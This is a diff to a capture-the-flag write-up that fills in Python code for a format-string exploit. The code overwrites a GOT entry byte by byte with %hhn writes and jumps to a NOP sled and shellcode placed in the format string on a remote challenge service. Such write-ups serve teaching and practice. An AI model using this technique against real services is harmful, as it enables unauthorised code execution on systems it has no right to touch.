@@ -86,7 +86,7 @@ OFFSET   TYPE              VALUE
 ```
 The address is 0x084a48.
 
-**(3)** The challenge is a remote service. Therefore, we're not able to put the shellcode in an environment variable. Instead, we'll put it in the format string (NX is not set). Using gdb, one can find out that the address of the format string is around 0xbffff350. So in order to jump there successfully, we'll put the shellcode at the end of the format string with a NOP-sled. Let's try to jump to 0xbffff3c0
+**(3)** The challenge is a remote service. Therefore, we're not able to put the shellcode in an environment variable. Instead, we'll put it in the format string (NX is not set). Using gdb, one can find out that the address of the format string is around 0xbffff350. So in order to jump there successfully, we'll put the shellcode at the end of the format string with a NOP-sled. Let's try to jump to 0xbffff41c.
 
 Now we're ready to build our exploit.<br>
 first we'll put the addresses of all 4 bytes of the GOT entry:
@@ -99,12 +99,22 @@ exploit += struct.pack('I', CLOSE_PLT + 3)
 ```
 Now we'll write each one to it's wanted value, using the 'hnn'-flag and '%x' for padding:
 ```py
-ADD HERE
+bytes = [0x00, 0x00, 0x00, 0x00]
+bytes[0] = ((SHELLCODE_ADDRESS >> 0) & 0xff) - (len(bytes) * 4)
+bytes[1] = ((SHELLCODE_ADDRESS >> 8) & 0xff) - (bytes[0] + len(bytes) * 4)
+bytes[2] = ((SHELLCODE_ADDRESS >> 16) & 0xff) - (bytes[0] + bytes[1]  + len(bytes) * 4)
+bytes[3] = ((SHELLCODE_ADDRESS >> 24) & 0xff) + 1
+
+exploit += '%{0}x%{1}$hhn'.format(bytes[0], OFFSET)
+exploit += '%{0}x%{1}$hhn'.format(bytes[1], OFFSET + 1)
+exploit += '%{0}x%{1}$hhn'.format(bytes[2], OFFSET + 2)
+exploit += '%{0}x%{1}$hhn'.format(bytes[3], OFFSET + 3)
 ```
 
 And finally we'll add the NOP-sled and the shellcode to the format string:
 ```py
-ADD HERE
+exploit += '\x90' * (BUFFER_LEN - len(exploit) - len(SHELLCODE))
+exploit += SHELLCODE
 ```
 
 So, after running the script (uploaded to this directory), the following output appears:
@@ -113,5 +123,5 @@ So, after running the script (uploaded to this directory), the following output 
 [+] Starting communicating with the service.
 [+] Preparing the exploit buffer with the shellcode.
 [+] The buffer sent to the remote service.
-[+] Flag: Flag: <censored>.
+[+] Flag: <censored>.
 ```
